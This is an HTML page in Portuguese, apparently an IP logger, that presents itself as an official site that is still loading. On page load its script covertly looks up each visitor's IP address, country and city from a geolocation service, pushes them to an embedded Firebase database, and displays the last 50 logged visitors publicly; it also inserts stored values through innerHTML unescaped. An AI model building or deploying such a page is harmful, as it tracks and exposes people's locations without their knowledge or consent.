<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Site esta carrengando</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    *, *::after, *::before{margin:0;padding:0;box-sizing:border-box;}
    body{background:#0a1226;font-family:'Roboto',sans-serif;color:#fff;min-height:100vh;}
    .container{width:min(95%,600px);margin:auto;padding:30px;animation:fadeInUp 0.5s ease-out;}
    @keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0);}}
    h1{text-align:center;font-size:1.5em;margin-bottom:10px;text-shadow:0 0 8px #00f5ff;}
    .subtitle{text-align:center;color:#a8a8a8;margin-bottom:25px;font-size:0.95em;}
    .card{background:rgba(10,25,50,0.8);border:1px solid #2a3853;border-radius:10px;padding:20px;margin:15px 0;position:relative;}
    .card:first-of-type{background:linear-gradient(145deg,#000d1a,#0a253f);}
    .ip, .region, .time{margin:8px 0;}
    .ip span, .region span{font-family:monospace;letter-spacing:1px;}
    .time{text-align:right;font-size:0.8em;color:#55ccff;}
    .warning{background:#1a0f0f;border:1px solid #ff4b4b;border-radius:8px;padding:12px;margin:15px 0;font-size:0.9em;text-align:center;}
    .warning > b{color:#ff4b4b;}
    .empty{text-align:center;color:#444;font-style:italic;margin-top:50px;}
    .loader{border:4px solid rgba(0,0,0,0.1);border-top-color:#00f5ff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:10px auto;}
    @keyframes spin{to{transform:rotate(360deg);}}
    @media(max-width:600px){.container{padding:15px;font-size:0.9em;}}
  </style>
</head>
<body>
  <div class="container">
    <h1>Cyber-Geo LIVE</h1>
    <p class="subtitle">Espera um pouco quase la/p>

    <div class="warning"><b>⚠️</b>Site ofc</div>

    <div id="loading" style="text-align:center;">
      <p>Carregando localização&hellip;</p>
      <div class="loader"></div>
    </div>

    <div id="main-card" class="card" style="display:none;">
      <div class="ip"><strong>IP:</strong> <span id="ip-value"></span></div>
      <div class="region"><strong>Região:</strong> <span id="region-value"></span></div>
      <div class="time" id="time-value"></div>
    </div>

    <div id="empty-msg" class="empty" style="display:none;">
      Nenhum dado coletado ainda (o rolê aparece aqui em segundos!) 👀
    </div>

    <div id="list" style="margin-top:30px;"></div>
  </div>

<script>
/* ====== CONFIGURAÇÕES ====== */
const config = {
  apiKey: "AIzaSyDegW2sEjWvx3Ih7U6vs45Gp8PeXyfJ90w",
  authDomain: "cyber-a41d9.firebaseapp.com",
  projectId: "cyber-a41d9",
  storageBucket: "cyber-a41d9.appspot.com",
  messagingSenderId: "563443982918",
  appId: "1:563443982918:web:61cf4b88f1b4ddd89ee047",
  databaseURL: "https://cyber-a41d9-default-rtdb.firebaseio.com/"
};

/* ====== GERA HTML GERAL ====== */
document.addEventListener("DOMContentLoaded", () => {
  const ipValueEl   = document.getElementById("ip-value");
  const regionValueEl = document.getElementById("region-value");
  const timeValueEl  = document.getElementById("time-value");
  const mainCardEl   = document.getElementById("main-card");
  const loadingEl    = document.getElementById("loading");
  const emptyMsgEl   = document.getElementById("empty-msg");
  const listEl       = document.getElementById("list");

  /* ====== INICIALIZAR FIREBASE ====== */
  const firebaseSnap = document.createElement("script");
  firebaseSnap.src  = "https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js";
  const dataSnap    = document.createElement("script");
  dataSnap.src      = "https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js";
  document.head.append(firebaseSnap, dataSnap);

  setTimeout(() => {
    firebase.initializeApp(config);
    const db = firebase.database();
    /* ====== PEGAR IP & REGIÃO ====== */
    fetch("https://geolocation-db.com/json/")
      .then(r => r.json())
      .then(result => {
        const data = {
          ip:        result.IPv4,
          country:   (result.country_name || '') + (result.city ? `, ${result.city}` : ''),
          timestamp: new Date().toISOString()
        };
        ipValueEl.textContent   = data.ip;
        regionValueEl.textContent = data.country;
        timeValueEl.textContent  = `Atualizado: ${new Date(data.timestamp).toLocaleString('pt-BR')}`;
        mainCardEl.style.display = "block";
        loadingEl.style.display = "none";

        /* Salvar no Firebase */
        db.ref("ip_list").push(data);

      })
      .catch(() => {
        ipValueEl.textContent   = "Indisponível";
        regionValueEl.textContent = "Offline";
        timeValueEl.textContent  = "Verifique conexão";
        mainCardEl.style.display = "block";
        loadingEl.style.display = "none";
        db.ref("ip_list").push({ip:"offline", region:"offline", time:new Date().toISOString()});
      });

    /* ====== OUVIR ATUALIZAÇÕES ====== */
    db.ref("ip_list").orderByChild("timestamp").limitToLast(50).on("value", snap => {
      const ips = [];
      snap.forEach(child => ips.push(child.val()));
      ips.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));

      listEl.innerHTML = "";
      ips.forEach(item => {
        const c = document.createElement("div");
        c.className = "card";
        c.innerHTML = `
          <div class="ip">IP: <span>${item.ip || '?:'}</span></div>
          <div class="region">Região: <span>${item.country || 'Offline'}</span></div>
          <div class="time">${new Date(item.timestamp).toLocaleString('pt-BR')}</div>
        `;
        listEl.appendChild(c);
      });
      if (ips.length === 0) emptyMsgEl.style.display = "block";
    });
  }, 500);
});
</script>
</body>
</html>
